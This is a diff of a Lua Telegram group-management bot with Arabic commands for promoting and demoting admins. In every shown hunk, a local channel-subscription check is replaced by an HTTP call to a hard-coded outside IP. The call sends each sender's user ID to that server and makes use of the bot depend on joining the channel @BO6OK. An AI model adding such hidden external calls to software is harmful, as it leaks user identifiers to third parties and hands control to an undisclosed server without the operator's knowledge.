-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -3714,14 +3726,11 @@ return false
 end
 if text and text:match("^الغاء العام @(.*)$") and DevBOYKAW(msg) then
 local username = text:match("^الغاء العام @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -3740,14 +3749,11 @@ return false
 end
 if text and text:match("^الغاء العام (%d+)$") and DevBOYKAW(msg) then
 local userid = text:match("^الغاء العام (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'GBan:User', userid)
 database:srem(bot_id..'Gmute:User', userid)
@@ -3937,14 +3943,11 @@ end
 
 if text == ("رفع مطور") and msg.reply_to_message_id_ and DevBOYKAW(msg) then
 function start_function(extra, result, success)
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -3958,14 +3961,11 @@ return false
 end
 if text and text:match("^رفع مطور @(.*)$") and DevBOYKAW(msg) then
 local username = text:match("^رفع مطور @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -3987,14 +3987,11 @@ return false
 end
 if text and text:match("^رفع مطور (%d+)$") and DevBOYKAW(msg) then
 local userid = text:match("^رفع مطور (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:sadd(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4010,14 +4007,11 @@ end;end,nil)
 return false 
 end
 if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevBOYKAW(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Sudo:User', result.sender_user_id_)
@@ -4032,14 +4026,11 @@ return false
 end
 if text and text:match("^تنزيل مطور @(.*)$") and DevBOYKAW(msg) then
 local username = text:match("^تنزيل مطور @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4057,14 +4048,11 @@ return false
 end  
 if text and text:match("^تنزيل مطور (%d+)$") and DevBOYKAW(msg) then
 local userid = text:match("^تنزيل مطور (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4120,14 +4108,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 
 if text == ("رفع مالك") and msg.reply_to_message_id_ and Sudo(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
@@ -4142,14 +4127,11 @@ return false
 end
 if text and text:match("^رفع مالك @(.*)$") and Sudo(msg) then
 local username = text:match("^رفع مالك @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4171,14 +4153,11 @@ return false
 end
 if text and text:match("^رفع مالك (%d+)$") and Sudo(msg) then
 local userid = text:match("^رفع مالك (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4194,14 +4173,11 @@ end;end,nil)
 return false
 end
 if text == ("تنزيل مالك") and msg.reply_to_message_id_ and Sudo(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
@@ -4216,14 +4192,11 @@ return false
 end
 if text and text:match("^تنزيل مالك @(.*)$") and Sudo(msg) then
 local username = text:match("^تنزيل مالك @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4241,14 +4214,11 @@ return false
 end
 if text and text:match("^تنزيل مالك (%d+)$") and Sudo(msg) then
 local userid = text:match("^تنزيل مالك (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4392,14 +4362,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 
 if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
@@ -4414,14 +4381,11 @@ return false
 end
 if text and text:match("^رفع منشئ اساسي @(.*)$") and CoSu(msg) then
 local username = text:match("^رفع منشئ اساسي @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4443,14 +4407,11 @@ return false
 end
 if text and text:match("^رفع منشئ اساسي (%d+)$") and CoSu(msg) then
 local userid = text:match("^رفع منشئ اساسي (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4466,14 +4427,11 @@ end;end,nil)
 return false
 end
 if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
@@ -4488,14 +4446,11 @@ return false
 end
 if text and text:match("^تنزيل منشئ اساسي @(.*)$") and CoSu(msg) then
 local username = text:match("^تنزيل منشئ اساسي @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4513,14 +4468,11 @@ return false
 end
 if text and text:match("^تنزيل منشئ اساسي (%d+)$") and CoSu(msg) then
 local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4593,14 +4545,11 @@ end
 end,nil)   
 end
 if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
@@ -4614,14 +4563,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 end
 if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then
 local username = text:match("^رفع منشئ @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4643,14 +4589,11 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
 local userid = text:match("^رفع منشئ (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4665,14 +4608,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 end
 if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
@@ -4687,14 +4627,11 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
 local username = text:match("^تنزيل منشئ @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4712,14 +4649,11 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
 local userid = text:match("^تنزيل منشئ (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4772,14 +4706,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
@@ -4794,14 +4725,11 @@ return false
 end  
 if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
 local username = text:match("^رفع مدير @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4824,14 +4752,11 @@ end
 
 if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
 local userid = text:match("^رفع مدير (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -4847,14 +4772,11 @@ end;end,nil)
 return false
 end  
 if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
@@ -4869,14 +4791,11 @@ return false
